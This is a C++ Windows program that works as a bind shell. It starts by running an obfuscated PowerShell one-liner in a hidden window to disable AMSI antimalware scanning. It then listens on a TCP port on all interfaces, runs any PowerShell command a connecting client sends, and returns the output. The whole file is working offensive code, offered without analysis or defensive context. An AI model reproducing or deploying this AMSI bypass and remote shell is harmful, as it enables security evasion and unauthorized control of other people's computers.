#include <iostream>
#include <winsock2.h> // Core Sockets
#include <windows.h>
#include <cstdint> // For AMSI Bypass

#define DEFAULT_CLIENT_IP "127.0.0.1"
#define DEFAULT_SERVER_IP "127.0.0.1"
#define DEFAULT_PORT 1024
#define BUFFER_SIZE 1024

struct SocketInfo {
    SOCKET serverSocket;
    sockaddr_in serverAddress;
};

void bypassAMSI() {
    HINSTANCE result = ShellExecute(
        NULL, 
        "open", 
        "powershell", 
        "-ExecutionPolicy Bypass -NoProfile -Command \"[ReF].\"`A$(echo sse)`mB$(echo L)`Y\".g`E$(echo tty)p`E\"(( \"Sy{3}ana{1}ut{4}ti{2}{0}ils\" -f'iUt','gement.A',\"on.Am`s\",\"stem.M\",\"oma\") ).\"$(echo ge)`Tf`i$(echo El)D\"((\"{0}{2}ni{1}iled\" -f'am','tFa',\"`siI\"),(\"{2}ubl{0}`,{1}{0}\" -f 'ic','Stat','NonP')).\"$(echo Se)t`Va$(echo LUE)\"($(),$(1 -eq 1))\"",
        NULL, 
        SW_HIDE);  // SW_HIDE to hide the PowerShell window

    if (reinterpret_cast<uintptr_t>(result) <= 32) {
        // ShellExecute failed
        std::cerr << "AMSI Bypass has Failed with Error: " << reinterpret_cast<uintptr_t>(result) << std::endl;
    } else {
        // ShellExecute succeeded
        std::cout << "AMSI Bypass Successful!" << std::endl;
    }
}

SocketInfo createServerSocket() {
    WSADATA winSockData; // Initializes Winsock
    if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        exit(1);
    }

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
    if (serverSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    sockaddr_in serverAddress; // Stores Address of Socket
    serverAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any IP
    serverAddress.sin_family = AF_INET; // IPv4

    std::cout << "Server socket created!" << std::endl;
    return {serverSocket, serverAddress};
}

SOCKET acceptClientConnection(SOCKET serverSocket, sockaddr_in& serverAddress, int port) {
    serverAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port

    if (bind(serverSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) { // Binds Socket to Address
        std::cerr << "Socket binding failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket); // Closes Socket
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    std::cout << "Server socket bound successfully!" << std::endl;

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
        std::cerr << "Socket listening failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket); // Closes Socket
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    std::cout << "Server socket is now listening!" << std::endl;

    SOCKET clientSocket = accept(serverSocket, NULL, NULL); // Accepts Connection
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket accepting failed: " << WSAGetLastError() << std::endl;
        closesocket(serverSocket); // Closes Socket
        WSACleanup(); // Terminates Winsock
        exit(1);
    }

    std::cout << "Server socket accepted client connection!" << std::endl;
    return clientSocket;
}

bool executeCommand(SOCKET clientSocket) {
    char buffer[BUFFER_SIZE] = {0};

    // Receive command from client
    int recvResult = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);

    if (recvResult == SOCKET_ERROR) {
        int errorCode = WSAGetLastError();
        if (errorCode == WSAECONNRESET) {
            std::cerr << "Connection reset by client. Closing connection." << std::endl;
        } else {
            std::cerr << "Failed to receive command, error: " << errorCode << std::endl;
        }
        return false;  // Terminate connection
    }

    if (recvResult == 0) {
        std::cerr << "Client gracefully disconnected (no data received)" << std::endl;
        return false;  // Client closed connection
    }

    buffer[recvResult] = '\0';  // Null-terminate received data
    std::cout << "Received command: " << buffer << std::endl;

    // Check for "exit" command
    if (strcmp(buffer, "exit") == 0) {
        const char* exitMessage = "Exiting...\n";
        send(clientSocket, exitMessage, strlen(exitMessage), 0);
        return false;  // End loop if exit command received
    }

    // Creates powershell command string
    std::string command = "Powershell -Command \"" + std::string(buffer) + "\"";

    // Execute the command
    FILE* pipe = _popen(command.c_str(), "r");  // Use `command` instead of `buffer`
    if (pipe == NULL) {
        const char* errorMsg = "Failed to execute command. Ensure the command is valid.\n";
        send(clientSocket, errorMsg, strlen(errorMsg), 0);
        return true;  // Continue listening for further commands
    }

    // Read output of the command
    char commandOutput[BUFFER_SIZE];
    std::string fullOutput;
    while (fgets(commandOutput, sizeof(commandOutput), pipe) != NULL) {
        fullOutput += commandOutput;
    }

    // Close the pipe and check the exit code
    int exitCode = _pclose(pipe);

    // Handle empty output
    if (fullOutput.empty()) {
        if (exitCode == 0) {
            fullOutput = "Command executed successfully, but there was no output.\n";
        } else {
            fullOutput = "Command failed to execute. Exit code: " + std::to_string(exitCode) + "\n";
        }
    }

    // Send output (or fallback message) back to the client
    int sendResult = send(clientSocket, fullOutput.c_str(), fullOutput.size(), 0);
    if (sendResult == SOCKET_ERROR) {
        std::cerr << "Failed to send command output, error: " << WSAGetLastError() << std::endl;
        return false;  // Terminate connection if unable to send data
    }

    return true;  // Continue listening for further commands
}

int main(int argc, char* argv[]) {
    std::string serverIP = DEFAULT_SERVER_IP;
    int port = DEFAULT_PORT;

    // Parse command-line arguments
    if (argc > 1) { port = atoi(argv[1]); } // Set Port

    std::cout << "Server IP: " << serverIP << std::endl;
    std::cout << "Port: " << port << std::endl;

    // Bypass AMSI
    bypassAMSI();

    // Create and bind server socket
    SocketInfo socketInfo = createServerSocket();
    // Start listening for clients and accept connections
    SOCKET clientSocket = acceptClientConnection(socketInfo.serverSocket, socketInfo.serverAddress, port);
    
    // Command Execution Loop
    bool continueRunning = true;
    while (clientSocket != INVALID_SOCKET && continueRunning) {
        continueRunning = executeCommand(clientSocket);
    }

    // Close client socket after communication
    closesocket(clientSocket);
    WSACleanup();
    std::cout << "Closing Socket Connection" << std::endl;

    return 0;
}
